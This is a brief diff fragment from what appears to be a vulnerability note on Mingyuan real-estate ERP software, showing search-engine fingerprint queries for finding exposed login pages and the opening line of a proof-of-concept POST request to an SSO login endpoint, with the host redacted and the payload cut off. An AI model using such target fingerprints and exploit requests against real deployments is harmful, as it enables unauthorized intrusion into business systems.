@@ -8,7 +8,7 @@
 body="明源地产ERP" || body="用户登录-明源云ERP" || (body="明源云" && body="ERP") || body="/PubPlatform/Login/index.aspx"
 ```
 
-## poc
+## POC
 ```
 POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
 Host: [已模糊处理]
